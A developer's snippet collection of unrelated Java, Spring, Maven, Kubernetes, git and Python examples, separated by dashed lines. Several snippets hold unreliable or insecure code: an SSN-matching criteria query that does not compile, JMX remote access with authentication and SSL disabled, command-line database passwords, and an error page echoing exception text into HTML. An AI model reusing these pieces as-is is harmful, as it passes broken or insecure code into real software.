Private-Package: org.assertj.core.internal,org.assertj.core.internal.byt
 ebuddy,org.assertj.core.internal.bytebuddy.asm,org.assertj.core.interna
 l.bytebuddy.agent.builder,org.assertj.core.internal.bytebuddy.dynamic,o
 rg.assertj.core.internal.bytebuddy.dynamic.scaffold,org.assertj.core.in
 ternal.bytebuddy.dynamic.scaffold.subclass,org.assertj.core.internal.by
 tebuddy.dynamic.scaffold.inline,org.assertj.core.internal.bytebuddy.dyn
 amic.loading,org.assertj.core.internal.bytebuddy.utility,org.assertj.co
 re.internal.bytebuddy.utility.visitor,org.assertj.core.internal.bytebud
 dy.utility.privilege,org.assertj.core.internal.bytebuddy.description,or
 g.assertj.core.internal.bytebuddy.description.enumeration,org.assertj.c
 ore.internal.bytebuddy.description.type,org.assertj.core.internal.byteb
 uddy.description.modifier,org.assertj.core.internal.bytebuddy.descripti
 on.method,org.assertj.core.internal.bytebuddy.description.annotation,or
 g.assertj.core.internal.bytebuddy.description.field,org.assertj.core.in
 ternal.bytebuddy.matcher,org.assertj.core.internal.bytebuddy.implementa
 tion,org.assertj.core.internal.bytebuddy.implementation.bytecode,org.as
 sertj.core.internal.bytebuddy.implementation.bytecode.assign.primitive,
 org.assertj.core.internal.bytebuddy.implementation.bytecode.assign,org.
 assertj.core.internal.bytebuddy.implementation.bytecode.assign.referenc
 e,org.assertj.core.internal.bytebuddy.implementation.bytecode.constant,
 org.assertj.core.internal.bytebuddy.implementation.bytecode.collection,
 org.assertj.core.internal.bytebuddy.implementation.bytecode.member,org.
 assertj.core.internal.bytebuddy.implementation.auxiliary,org.assertj.co
 re.internal.bytebuddy.implementation.bind,org.assertj.core.internal.byt
 ebuddy.implementation.bind.annotation,org.assertj.core.internal.bytebud
 dy.implementation.attribute,org.assertj.core.internal.bytebuddy.pool,or
 g.assertj.core.internal.bytebuddy.jar.asm,org.assertj.core.internal.byt
 ebuddy.jar.asm.commons,org.assertj.core.internal.bytebuddy.jar.asm.sign
 ature,org.assertj.core.internal.bytebuddy.build,org.assertj.core.error,
 org.assertj.core.error.future,org.assertj.core.error.uri,org.assertj.co
 re.extractor,org.assertj.core.description,org.assertj.core.matcher,org.
 assertj.core.groups,org.assertj.core.api,org.assertj.core.api.iterable,
 org.assertj.core.api.exception,org.assertj.core.api.filter,org.assertj.
 core.util,org.assertj.core.util.introspection,org.assertj.core.util.xml
 ,org.assertj.core.util.diff,org.assertj.core.util.diff.myers,org.assert
 j.core.condition,org.assertj.core.data,org.assertj.core.configuration,o
 rg.assertj.core.presentation
Require-Capability: osgi.ee;filter:="(&(osgi.ee=JavaSE)(version=1.8))"
Tool: Bnd-3.0.0.201509101326
--------------------------------------------------------------------------------------------------------
awk '{print toupper(substr($0,1,1)) tolower(substr($0,2)) }'
--------------------------------------------------------------------------------------------------------
Stream<String> streamGenerated =
  Stream.generate(() -> "element").limit(10);
  
Stream<Integer> streamIterated = Stream.iterate(40, n -> n + 2).limit(20);

int reducedParallel = Arrays.asList(1, 2, 3).parallelStream()
    .reduce(10, (a, b) -> a + b, (a, b) -> {
       log.info("combiner was called");
       return a + b;
    });

String listToString = productList.stream().map(Product::getName)
  .collect(Collectors.joining(", ", "[", "]"));

int summingPrice = productList.stream()
  .collect(Collectors.summingInt(Product::getPrice));
  
  Collector<Product, ?, LinkedList<Product>> toLinkedList =
  Collector.of(LinkedList::new, LinkedList::add, 
    (first, second) -> { 
       first.addAll(second); 
       return first; 
    });
 
LinkedList<Product> linkedListOfPersons =
  productList.stream().collect(toLinkedList);
  
int reducedParallel = Arrays.asList(1, 2, 3).parallelStream()
    .reduce(10, (a, b) -> a + b, (a, b) -> {
       log.info("combiner was called");
       return a + b;
    });
	
Stream<String> streamOfString =
  Pattern.compile(", ").splitAsStream("a, b, c");
  
Stream<Integer> streamIterated = Stream.iterate(40, n -> n + 2).limit(20);

Stream<String> streamBuilder =
  Stream.<String>builder().add("a").add("b").add("c").build();
--------------------------------------------------------------------------------------------------------
import numpy as np

In [2]:

%matplotlib inline
import matplotlib.pyplot as plt

In [3]:

from sklearn.datasets.samples_generator import make_circles

In [4]:

X, y = make_circles(n_samples=1000,
                    noise=0.1,
                    factor=0.2,
                    random_state=0)


X.shape

plt.figure(figsize=(5, 5))
plt.plot(X[y==0, 0], X[y==0, 1], 'ob', alpha=0.5)
plt.plot(X[y==1, 0], X[y==1, 1], 'xr', alpha=0.5)
plt.xlim(-1.5, 1.5)
plt.ylim(-1.5, 1.5)
plt.legend(['0', '1'])
plt.title("Blue circles and Red crosses");

from tensorflow.keras.models import Sequential
from tensorflow.keras.layers import Dense
from tensorflow.keras.optimizers import SGD

model = Sequential([
    Dense(4, input_shape=(2,), activation='tanh'),
    Dense(1, activation='sigmoid'),
])

model.compile(SGD(lr=0.5),
              'binary_crossentropy',
              metrics=['accuracy'])

model.fit(X, y, epochs=15)

hticks = np.linspace(-1.5, 1.5, 101)
vticks = np.linspace(-1.5, 1.5, 101)
aa, bb = np.meshgrid(hticks, vticks)
ab = np.c_[aa.ravel(), bb.ravel()]
c = model.predict(ab)
cc = c.reshape(aa.shape)

plt.figure(figsize=(5, 5))
plt.contourf(aa, bb, cc, cmap='bwr', alpha=0.2)
plt.plot(X[y==0, 0], X[y==0, 1], 'ob', alpha=0.5)
plt.plot(X[y==1, 0], X[y==1, 1], 'xr', alpha=0.5)
plt.xlim(-1.5, 1.5)
plt.ylim(-1.5, 1.5)
plt.legend(['0', '1'])
plt.title("Blue circles and Red crosses");
--------------------------------------------------------------------------------------------------------
        <plugins>
          <plugin>
            <groupId>org.apache.maven.plugins</groupId>
            <artifactId>maven-antrun-plugin</artifactId>
            <executions>
              <execution>
                <id>prepare-checkout</id>
                <goals>
                  <goal>run</goal>
                </goals>
                <phase>pre-site</phase>
                <configuration>
                  <tasks>
                    <exec executable="svn">
                      <arg line="checkout --depth immediates ${commons.scmPubUrl} ${commons.scmPubCheckoutDirectory}"/>
                    </exec>
                    <exec executable="svn">
                      <arg line="update --set-depth exclude ${commons.scmPubCheckoutDirectory}/javadocs"/>
                    </exec>
                    <pathconvert pathsep=" " property="dirs">
                      <dirset dir="${commons.scmPubCheckoutDirectory}" includes="*"/>
                    </pathconvert>
                    <exec executable="svn">
                      <arg line="update --set-depth infinity ${dirs}"/>
                    </exec>
                  </tasks>
                </configuration>
              </execution>
            </executions>
          </plugin>
        </plugins>
--------------------------------------------------------------------------------------------------------
IntFunction<String[]> intFunction = new IntFunction<String[]>() {
    @Override
    public String[] apply(int value) {
        return new String[value];
    }
};

String[] myNewArray = myNewStream.toArray(intFunction);
--------------------------------------------------------------------------------------------------------
Map<String, String> combined = Stream.of(first, second)
  .map(Map::entrySet)
  .flatMap(Collection::stream)
  .collect(Collectors.toMap(Map.Entry::getKey, Map.Entry::getValue, String::concat));
  
public static <K, V> Map<K, V> zipToMap(List<K> keys, List<V> values) {
    Iterator<K> keyIter = keys.iterator();
    Iterator<V> valIter = values.iterator();
    return IntStream.range(0, keys.size()).boxed()
            .collect(Collectors.toMap(_i -> keyIter.next(), _i -> valIter.next()));
}
--------------------------------------------------------------------------------------------------------
Map<Integer,DataPointSummary> coll = listeAllerPunkte.stream().collect(
    groupingBy(DataPoint::getId, Collector.of(
        DataPointSummary::new, DataPointSummary::add, DataPointSummary::merge)));
--------------------------------------------------------------------------------------------------------
Int wordCount = articleStream.collect(totalWordCountCollector);

Collector.of(  
  () -> new int[1],
  (result, article) -> result[0] += article.getWordCount(),
  (result1, result2) -> {
    result1[0] += result2[0];
    return result1;
  },
  total -> total[0] 
);
--------------------------------------------------------------------------------------------------------
kubectl apply -f <(istioctl kube-inject -f samples/bookinfo/platform/kube/bookinfo.yaml)
kubectl get services
kubectl get pods
kubectl exec -it $(kubectl get pod -l app=ratings -o jsonpath='{.items[0].metadata.name}') -c ratings -- curl productpage:9080/productpage | grep -o "<title>.*</title>"
kubectl get destinationrules -o yaml
$ kubectl get virtualservices   #-- there should be no virtual services
$ kubectl get destinationrules  #-- there should be no destination rules
$ kubectl get gateway           #-- there should be no gateway
$ kubectl get pods               #-- the Bookinfo pods should be deleted
$ kubectl get virtualservices   #-- there should be no more routing rules
$ docker ps -a                   #-- the Bookinfo containers should be deleted

$ kubectl apply -f - <<EOF
apiVersion: extensions/v1beta1
kind: Ingress
metadata:
  name: simple-ingress
  annotations:
    kubernetes.io/ingress.class: istio
spec:
  rules:
  - http:
      paths:
      - path: /echo
        backend:
          serviceName: esp-echo
          servicePort: 80
EOF

$ sudo apt-get update && sudo apt-get install -y mariadb-server
$ sudo mysql

mysql -u root -ppassword test -e "select * from ratings;"

mysql -u root -ppassword test -e  "update ratings set rating=1 where reviewid=1;select * from ratings;"
--------------------------------------------------------------------------------------------------------
  <profiles>
    <profile>
      <id>java9</id>
      <properties>
        <argLine>--add-opens java.base/java.lang=ALL-UNNAMED --add-opens java.base/java.util=ALL-UNNAMED
          --add-opens java.base/java.io=ALL-UNNAMED --add-opens java.base/java.math=ALL-UNNAMED</argLine>
      </properties>
    </profile>
  </profiles>
--------------------------------------------------------------------------------------------------------
(?:\*?\.)+(?:[a-z\d](?:[a-z\d-]{0,63}[a-z\d])?\.)+[a-z\d][a-z\d-]{0,63}[a-z\d]|(?:[a-z\d](?:[a-z\d-]{0,63}[a-z\d])?\.)+[a-z\d][a-z\d-]{0,63}[a-z\d]
domain
^https:\/\/(.*\.)*wired\.com$
(\u00a9|\u00ae|[\u2000-\u3300]|\ud83c[\ud000-\udfff]|\ud83d[\ud000-\udfff]|\ud83e[\ud000-\udfff])
^((?!(10))[0-9]{11})$

String target = someString.replaceAll("<[^>]*>", "");
String target = someString.replaceAll("(?i)<td[^>]*>", "");
String target = someString.replaceAll("(?i)<td[^>]*>", " ").replaceAll("\\s+", " ").trim();
String noHTMLString = htmlString.replaceAll("\\<.*?\\>", "");

body.getContentAsString().replaceAll("\\<.*?\\>", "");
new HtmlToPlainText().getPlainText(Jsoup.parse(html))
--------------------------------------------------------------------------------------------------------
import java.util.regex.Matcher;
import java.util.regex.Pattern;
 
public class UsernameValidator{
 
	  private Pattern pattern;
	  private Matcher matcher;
 
	  private static final String USERNAME_PATTERN = "^[a-z0-9_-]{3,15}$";
 
	  public UsernameValidator(){
		  pattern = Pattern.compile(USERNAME_PATTERN);
	  }
 
	  /**
	   * Validate username with regular expression
	   * @param username username for validation
	   * @return true valid username, false invalid username
	   */
	  public boolean validate(final String username){
 
		  matcher = pattern.matcher(username);
		  return matcher.matches();
 
	  }
}
--------------------------------------------------------------------------------------------------------
       String pathValue = null;
        // extract Path annotation value
        List<AnnotationSource<JavaClassSource>> listAnnotations = javaClass.getAnnotations();
        for (AnnotationSource annotation :listAnnotations) {
            if (annotation.getName().equals("Path")) {
                pathValue = annotation.getStringValue();
            }
        }
        AnnotationSource<JavaClassSource> apiAnnotation = javaClass.addAnnotation("com.wordnik.swagger.annotations.Api");
        apiAnnotation.setLiteralValue("\"" + pathValue + "\"") ;

        List<MethodSource<JavaClassSource>> methods = javaClass.getMethods();

        for (MethodSource<JavaClassSource> method: methods) {
           for (AnnotationSource annotation: method.getAnnotations()) {
               if (annotation.getName().equals("DELETE") || annotation.getName().equals("GET")
                       || annotation.getName().equals("POST") || annotation.getName().equals("PUT")) {
                   String returnTypeClass = method.getReturnType().getQualifiedName();
                   AnnotationSource<JavaClassSource> apiOperation = method.addAnnotation("com.wordnik.swagger.annotations.ApiOperation");
                   apiOperation.setLiteralValue("value", "\"value\"");
                   apiOperation.setLiteralValue("response", "\"" + returnTypeClass + ".class\"");

               }
           }
        }
--------------------------------------------------------------------------------------------------------
@Configuration
    public class SwaggerConfiguration implements WebMvcConfigurer {

      private final String swaggerUILocation = "whatEverLocationYouWant";
      private final String swaggerApiDocsLocation = "whatEverLocationYouWant";

      @Override
      public void addResourceHandlers(ResourceHandlerRegistry registry) {
        registry.addResourceHandler(swaggerUILocation + "**")
            .addResourceLocations("classpath:/swagger-ui/");
        registry.addResourceHandler(swaggerApiDocsLocation + "**")
            .addResourceLocations("classpath:/swagger/");
      }
    }
--------------------------------------------------------------------------------------------------------
<style type=text/css>
<!--
 body 
 { scrollbar-face-color: #006000;
   scrollbar-highlight-color: #9999999;
   scrollbar-shadow-color: #666666;
   scrollbar-3dlight-color: #666666;
   scrollbar-arrow-color: #ffffff;
   scrollbar-track-color: #e0efe0;
   scrollbar-darkshadow-color: #666666;
 }
//-->
</style>
--------------------------------------------------------------------------------------------------------
npm: npm install infinite-scroll

Bower: bower install infinite-scroll --save

Yarn: yarn add infinite-scroll
--------------------------------------------------------------------------------------------------------
curl -X GET "http://vdlg-pba11-auth-1.pba.internal:5000/api/internal/v1/users/alexander.rogalskiy%40paragon-software.com" -H "accept: text/plain"
--------------------------------------------------------------------------------------------------------
Note: Should you find difficulties connecting to the WebDAV directory, update the Basic Authentication Level in Windows Registry.

1. Right-click Start and select Run.

2. Type regedit and press Enter to open Windows Registry Editor.

3. Go to the directory path: “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WebClient\Parameters.”

Map Webdav Drive Windows 10 Registry Editor Parameters Basic Auth Level

4. Find “BasicAuthLevel” value. By default the value is set at 2, but if it’s not, right-click and select Modify and then change to 2.
--------------------------------------------------------------------------------------------------------
sudo apt install flatpak
sudo flatpak remote-add --if-not-exists flathubhttps://dl.flathub.org/repo/flathub.flatpakrepo
sudo flatpak remote-add --if-not-exists winepak https://dl.winepak.org/repo/winepak.flatpakrepo
flatpak search overwatch
sudo flatpak install winepak com.blizzard.Overwatch
--------------------------------------------------------------------------------------------------------
.cursor {cursor: url(cursor.svg) 3 3, pointer;}
.cursor {cursor: url(cursor.svg), url(path/to/image.png), wait;}
.cursor {cursor: url('path/to/image.png'), auto;}
--------------------------------------------------------------------------------------------------------
ip a | grep inet
--------------------------------------------------------------------------------------------------------
git log --oneline
git log --stat
git log -p
git show
git show 97a7c5f0d

git show 97a7c5f0d --stat

git shortlog
git shortlog -s
git shortlog -n
git shortlog -s -n
git log --pretty="%cn committed %h on %cd"
git log --author="Dan Abramov"
git log --author="Dan Abramov" --oneline
git log -4 --oneline
git log --after="1-7-2017"
git log --before="1-7-2017"
git log --after="1-7-2017" --oneline --pretty="%cn committed %h on %cd"
git log --before="a week ago" --oneline --pretty="%cn committed %h on %cd"
git log --merges
git log --decorate --oneline

--------------------------------------------------------------------------------------------------------
spring:
  profiles:
    include: regex
  autoconfigure:
    exclude:
      - org.springframework.boot.autoconfigure.data.redis.RedisAutoConfiguration
      - org.springframework.boot.autoconfigure.data.redis.RedisRepositoriesAutoConfiguration
--------------------------------------------------------------------------------------------------------
    @Bean
    Map<String, ?> hibernateProperties ()
    {
        Map<String, Object> m = new HashMap<> ();
        m.put ("hibernate.dialect", MySQL5Dialect.class);
        m.put ("hibernate.dialect.storage_engine", "innodb");
        boolean devSystem = isDevSystem ();
        m.put ("hibernate.hbm2ddl.auto", devSystem ? "update" : "create-only");  // will need to handle updates by hand on live system, but creation is OK.
        m.put ("hibernate.show_sql", "" + devSystem);
        m.put ("hibernate.cache.use_second_level_cache", "" + !devSystem);
        return m;
    }
--------------------------------------------------------------------------------------------------------
@RequestMapping("/pod/{id}")
@Transactional(readOnly = true)
public Stream<RSSPodcastItem> podItems (@PathVariable("id") UUID id) {
    try (Stream<RSSPodcastItem> items = repository.findByPodcast(...)) {
        return items...;
    }
}

@RestController
public class XService {

    class XDto{
        final int x;
        public XDto(int x) {this.x = x;}
    }

    Stream<XDto> produceX(){
        return IntStream.range(1,10).mapToObj(i -> {
            System.out.println("produce "+i);
            try {Thread.sleep(1000);} catch (InterruptedException e) {e.printStackTrace();}
            return new XDto(i);
        });
    }

    // stream of Server-Sent Events (SSE)
    @GetMapping(value = "/api/x/sse", 
    produces = MediaType.TEXT_EVENT_STREAM_VALUE)
    public Flux<XDto> getXSse() {
        return Flux.fromStream(produceX());
    }

    // stream of JSON lines
    @GetMapping(value = "/api/x/json-stream", 
    produces = MediaType.APPLICATION_STREAM_JSON_VALUE)
    public Flux<XDto> getAllJsonStream() {
        return Flux.fromStream(produceX());
    }

    // same as List<XDto> - blocking JSON list
    @GetMapping(value = "/api/x/json-list", 
    produces = MediaType.APPLICATION_JSON_VALUE)
    public Flux<XDto> getAll() {
        return Flux.fromStream(produceX());
    }
}

try (Stream<User> foundUsersStream 
  = userRepository.findAllByName(USER_NAME_ADAM)) {
  
assertThat(foundUsersStream.count(), equalTo(3l));

    @Autowired
    private FileRepository fileRepository;

    @GetMapping("/test4")
    @Transactional
    public Stream<FileEntity> get4() {
        try (final Stream<FileEntity> items = this.fileRepository.streamAll()) {
            return items;
        }
    }
--------------------------------------------------------------------------------------------------------
package example.springdata.jpa.java8;

import java.util.List;
import java.util.Optional;
import java.util.concurrent.CompletableFuture;
import java.util.stream.Stream;

import org.springframework.data.jpa.repository.Query;
import org.springframework.data.repository.CrudRepository;
import org.springframework.data.repository.Repository;
import org.springframework.scheduling.annotation.Async;

/**
 * Repository to manage {@link Customer} instances.
 *
 * @author Oliver Gierke
 * @author Thomas Darimont
 */
public interface CustomerRepository extends Repository<Customer, Long> {

	/**
	 * Special customization of {@link CrudRepository#findOne(java.io.Serializable)} to return a JDK 8 {@link Optional}.
	 *
	 * @param id
	 * @return
	 */
	Optional<Customer> findById(Long id);

	/**
	 * Saves the given {@link Customer}.
	 *
	 * @param customer
	 * @return
	 */
	<S extends Customer> S save(S customer);

	/**
	 * Sample method to derive a query from using JDK 8's {@link Optional} as return type.
	 *
	 * @param lastname
	 * @return
	 */
	Optional<Customer> findByLastname(String lastname);

	/**
	 * Sample default method to show JDK 8 feature support.
	 *
	 * @param customer
	 * @return
	 */
	default Optional<Customer> findByLastname(Customer customer) {
		return findByLastname(customer == null ? null : customer.lastname);
	}

	/**
	 * Sample method to demonstrate support for {@link Stream} as a return type with a custom query. The query is executed
	 * in a streaming fashion which means that the method returns as soon as the first results are ready.
	 *
	 * @return
	 */
	@Query("select c from Customer c")
	Stream<Customer> streamAllCustomers();

	/**
	 * Sample method to demonstrate support for {@link Stream} as a return type with a derived query. The query is
	 * executed in a streaming fashion which means that the method returns as soon as the first results are ready.
	 *
	 * @return
	 */
	Stream<Customer> findAllByLastnameIsNotNull();

	@Async
	CompletableFuture<List<Customer>> readAllBy();
}
--------------------------------------------------------------------------------------------------------
@Controller
public class CustomErrorController implements ErrorController {

  @RequestMapping("/error")
  @ResponseBody
  public String handleError(HttpServletRequest request) {
      Integer statusCode = (Integer) request.getAttribute("javax.servlet.error.status_code");
      Exception exception = (Exception) request.getAttribute("javax.servlet.error.exception");
      return String.format("<html><body><h2>Sample Error Page</h2><div>Status code: <b>%s</b></div>"
                      + "<div>Exception Message: <b>%s</b></div><body></html>",
              statusCode, exception==null? "N/A": exception.getMessage());
  }

  @Override
  public String getErrorPath() {
      return "/error";
  }
}
--------------------------------------------------------------------------------------------------------
#function to zip text + encrypt, 2 params (text to encrypt, filename w/o extension) 
function zipe() {
    echo "$1" > $2.txt && zip -e $2.zip $2.txt && rm $2.txt
}
--------------------------------------------------------------------------------------------------------
-Dcom.sun.management.jmxremote
-Dcom.sun.management.jmxremote.port=1234
-Dcom.sun.management.jmxremote.authenticate=false
-Dcom.sun.management.jmxremote.ssl=false
-Djava.rmi.server.hostname=127.0.0.1
--------------------------------------------------------------------------------------------------------
import javax.sql.DataSource;

import org.apache.commons.lang.Validate;
import org.springframework.jdbc.core.BatchPreparedStatementSetter;
import org.springframework.jdbc.core.JdbcTemplate;

/**
 * @author bchild
 *
 */
public abstract class AbstractBatchCustomRepositoryImpl {
	
	private JdbcTemplate jdbcTemplate = null;

	protected int executeBatch(String sql, BatchPreparedStatementSetter batchPreparedStatementSetter) {
		Validate.notNull(jdbcTemplate, "Datasource not set for batch statement.");
		int[] rows = jdbcTemplate.batchUpdate(sql, batchPreparedStatementSetter);
		return sumRows(rows);
	}
	
	private int sumRows(int[] rows) {
		int rowCount = 0;
		for(int row : rows) {
			rowCount += row;
		}
		return rowCount;
	}

	public void setDataSource(DataSource dataSource) {
		this.jdbcTemplate = new JdbcTemplate(dataSource);
	}

}


import java.util.Collection;

/**
 * 
 * @author brettchild
 *
 * @param <T>
 */
public interface BatchSaveCustomRepository<T> {
	
	/**
	 * @param records
	 * @return number of records saved
	 */
	int batchSave(Collection<T> records);
}

import java.util.Date;
import java.util.List;

import org.springframework.data.jpa.repository.JpaRepository;
import org.springframework.data.repository.query.Param;

import com.bmchild.data.shared.batch.BatchSaveCustomRepository;

/*
* Our Repository get the default functionality of the JPARepository plus we all also add our batchSave.
* If we wanted to also add a batch update we could make a batch update interface and implement that in our concrete impl class
*/
public interface MyEntityRepository extends JpaRepository<MyEntity, Long>, BatchSaveCustomRepository<MyEntity> {
	
}


import java.sql.Date;
import java.sql.PreparedStatement;
import java.sql.SQLException;
import java.util.Collection;
import java.util.List;

import javax.annotation.PostConstruct;
import javax.sql.DataSource;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.jdbc.core.BatchPreparedStatementSetter;

import com.bmchild.data.shared.batch.AbstractBatchCustomRepositoryImpl;
import com.bmchild.data.shared.batch.BatchSaveCustomRepository;
import com.bmchild.data.shared.common.util.CollectionUtil;

/*
* Impl of our repo so we can add our batch save functionality
*/
public class MyEntityRepositoryImpl extends AbstractBatchCustomRepositoryImpl implements BatchSaveCustomRepository<MyEntity> {

	private static final String BATCH_INSERT_SQL = "insert into myentity (field1, field2) "
			+ " VALUES (?, ?)";

	/* We limit the number of records we process at a time to avoid too many parameters per query */		
	private static final Integer BATCH_SIZE = 500; 

	@Autowired
	@Qualifier("dataSource")
	private DataSource dataSource;

	@PostConstruct
	public void postConstruct() {
		setDataSource(dataSource);
	}
	
	@Override
	public int batchSave(Collection<MyEntity> records) {
		int count = 0;
		for(final List<MyEntity> batch : CollectionUtil.split(records, BATCH_SIZE)) {
			count += executeBatch(BATCH_INSERT_SQL, new BatchPreparedStatementSetter() {
			
				@Override
				public void setValues(PreparedStatement ps, int i) throws SQLException {
					MyEntity l = batch.get(i);
					ps.setString(1, l.getField1());
					ps.setString(2, l.getField2());
				}
				
				@Override
				public int getBatchSize() {
					return batch.size();
				}
			});
		}
		return count;
	}

}
--------------------------------------------------------------------------------------------------------
  HttpHeaders headers = new HttpHeaders();
  headers.setContentType(MediaType.parseMediaType(mediaType));
  headers.setContentDispositionFormData("attachment", fileName);
  return new ResponseEntity<>(fileContent, headers, HttpStatus.OK);
--------------------------------------------------------------------------------------------------------
@RequestMapping(value = "/createReport", method = RequestMethod.POST,produces="application/pdf")
 @ResponseStatus(value = HttpStatus.OK)
 public ResponseEntity<byte[]> createReport(@RequestBody ReporteDTO reporteDTO) {
   byte[] outputReport = null;
   HttpHeaders headers = new HttpHeaders();
   headers.setContentType(MediaType.parseMediaType("application/pdf"));
   headers.setContentDispositionFormData("inline", "archivo.pdf");
   headers.setCacheControl("must-revalidate, post-check=0, pre-check=0");
      outputReport = getFilePdf();
   ResponseEntity<byte[]> response = new ResponseEntity<byte[]>(outputReport, headers, HttpStatus.OK);
   return response;
 }
 
 @RequestMapping(value = "/{id}/download", method = RequestMethod.GET)
public ResponseEntity<byte[]> download(@PathVariable String id) throws Exception {
  DocumentId documentId = new DocumentId(id);
  byte[] bytes = documentPdfService.generatePdf(documentId);
  HttpHeaders headers = new HttpHeaders();
  headers.setContentType(MediaType.parseMediaType("application/pdf"));
  String filename = documentPdfService.getFileName(documentId);
  headers.setContentDispositionFormData(filename, filename);
  headers.setCacheControl("must-revalidate, post-check=0, pre-check=0");
  return new ResponseEntity<>(bytes, headers, HttpStatus.OK);
}

--------------------------------------------------------------------------------------------------------
/*
* Matches either on userId or lastName + last4 digits of SSN
*/
public List<User> findAllByUserIdOrLastNameLastFourSSN( List<UserParameter> parameters ) {
	  
	// setup the criteria API to query User
	CriteriaBuilder cBuilder = getEntityManager().getCriteriaBuilder();
	CriteriaQuery<User> criteriaQuery = cBuilder.createQuery(User.class);
	Root<User> root = criteriaQuery.from(User.class);
	criteriaQuery.select(root);

	// set up lists to store the userId or predicates to match lastName AND last 4 of ssn
	List<String> userIds = ArrayList<>();
	List<Predicate> nameAndSSNPredicates = new ArrayList<>();

	// Loop over parameters, adding predicates and parameters as needed
	int i = 0;
	for(UserParameter param : parameters) {
	  
	  if(null == param.getUserId) {
	    // match lastname + ssn with unique parameters
	    Predicate predicate = cBuilder.and(
	      ParameterExpression<String> lastNameParam = cBuilder.parameter(String.class, "lastName" + i);
				ParameterExpression<String> ssnParam = cBuilder.parameter(String.class, "ssn" + i);
				cBuilder.equal(root.get("lastName"), lastNameParam),
				cBuilder.equal( cBuilder.substring(root.get("ssn"), cBuilder.diff( cBuilder.length( root.get("ssn") ), 3), cBuilder.literal(4) ), ssnParam)
			);
			nameAndSSNPredicates.add(predicate);
	  } else {
	    // match to userId
	    userIds.add(param.getUserId);
	  }
	  
	}

	// Add userIds to list of predicates
	if(!userIds.isEmpty()) {
	  nameAndSSNPredicates.add(root.get("userId").in(userIds));
	}

	// seperate all generated predicates with an OR
	Predicate combinedPredicate = cBuilder.or(nameAndSSNPredicates.toArray(new Predicate[nameAndSSNPredicates.size()]));

	// Create Query and add parameters
	criteriaQuery.where(combinedPredicate);
	Query query = getEntityManager().createQuery(criteriaQuery);

	int x = 0;
	for(UserParameter param : parameters) {
	  if(null == param.getUserId) {
	  // only set parameters for lastname and ssn matches
	      query.setParameter("lastname" + x, param.getLastName());
	      
		  .setParameter("ssn" + x, param.getSsn());
	  } 
	  x++;
	}

	// run the query
	return query.getResultList();
		
}

select *
from User 
where
userId in (:userIds)
-- Then we need an OR clause for each match we want
OR ( lastName = :lastName1 AND SUBSTRING(ssn, LEN(ssn)-3, 4) = :lastFourSsn1)
OR ( lastName = :lastName2 AND SUBSTRING(ssn, LEN(ssn)-3, 4) = :lastFourSsn2)
-- ... 
--------------------------------------------------------------------------------------------------------
	/**
	 * 下载
	 * @param file 文件
	 * @param fileName 生成的文件名
	 * @return {ResponseEntity}
	 */
	protected ResponseEntity<Resource> download(File file, String fileName) {
		Resource resource = new FileSystemResource(file);
		
		HttpServletRequest request = ((ServletRequestAttributes) RequestContextHolder
				.getRequestAttributes()).getRequest();
		String header = request.getHeader("User-Agent");
		// 避免空指针
		header = header == null ? "" : header.toUpperCase();
		HttpStatus status;
		if (header.contains("MSIE") || header.contains("TRIDENT") || header.contains("EDGE")) {
			fileName = URLUtils.encodeURL(fileName, Charsets.UTF_8);
			status = HttpStatus.OK;
		} else {
			fileName = new String(fileName.getBytes(Charsets.UTF_8), Charsets.ISO_8859_1);
			status = HttpStatus.CREATED;
		}
		HttpHeaders headers = new HttpHeaders();
		headers.setContentType(MediaType.APPLICATION_OCTET_STREAM);
		headers.setContentDispositionFormData("attachment", fileName);
		return new ResponseEntity<Resource>(resource, headers, status);
	}
--------------------------------------------------------------------------------------------------------
    @PostMapping("/login")
    @CsrfToken(remove = true)
    @ResponseBody
--------------------------------------------------------------------------------------------------------
import com.baomidou.mybatisplus.mapper.BaseMapper;
import com.ikm.xmanager.cms.model.RoleResource;
import org.apache.ibatis.annotations.Delete;
import org.apache.ibatis.annotations.Param;
import org.apache.ibatis.annotations.Select;

import java.io.Serializable;

/**
 *
 * RoleResource 表数据库控制层接口
 *
 */
public interface RoleResourceMapper extends BaseMapper<RoleResource> {

    @Select("SELECT e.id AS id FROM role r LEFT JOIN role_resource e ON r.id = e.role_id WHERE r.id = #{id}")
    Long selectIdListByRoleId(@Param("id") Long id);

    @Delete("DELETE FROM role_resource WHERE resource_id = #{resourceId}")
    int deleteByResourceId(@Param("resourceId") Serializable resourceId);

}

import com.baomidou.mybatisplus.mapper.BaseMapper;
import com.ikm.xmanager.cms.model.UserRole;
import org.apache.ibatis.annotations.Delete;
import org.apache.ibatis.annotations.Param;
import org.apache.ibatis.annotations.ResultType;
import org.apache.ibatis.annotations.Select;

import java.util.List;

/**
 *
 * UserRole 表数据库控制层接口
 *
 */
public interface UserRoleMapper extends BaseMapper<UserRole> {

    List<UserRole> selectByUserId(@Param("userId") Long userId);

    @Select("select role_id AS roleId from user_role where user_id = #{userId}")
    @ResultType(Long.class)
    List<Long> selectRoleIdListByUserId(@Param("userId") Long userId);

    @Delete("DELETE FROM user_role WHERE user_id = #{userId}")
    int deleteByUserId(@Param("userId") Long userId);

}
--------------------------------------------------------------------------------------------------------
    /**
     * 未授权
     * @return {String}
     */
    @GetMapping("/unauth")
    public String unauth() {
        if (SecurityUtils.getSubject().isAuthenticated() == false) {
            return "redirect:/login";
        }
        return "unauth";
    }
--------------------------------------------------------------------------------------------------------
import com.ikm.xmanager.cms.service.ISysLogService;
import com.ikm.xmanager.commons.result.PageInfo;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;


/**
 * @description：日志管理
 * @author：zhixuan.wang
 * @date：2015/10/30 18:06
 */
@Controller
@RequestMapping("/sysLog")
public class SysLogController {
    @Autowired
    private ISysLogService sysLogService;

    @GetMapping("/manager")
    public String manager() {
        return "admin/syslog";
    }

    @PostMapping("/dataGrid")
    @ResponseBody
    public PageInfo dataGrid(Integer page, Integer rows, 
            @RequestParam(value = "sort", defaultValue = "create_time") String sort, 
            @RequestParam(value = "order", defaultValue = "DESC") String order) {
        PageInfo pageInfo = new PageInfo(page, rows, sort, order);
        sysLogService.selectDataGrid(pageInfo);
        return pageInfo;
    }
}
--------------------------------------------------------------------------------------------------------
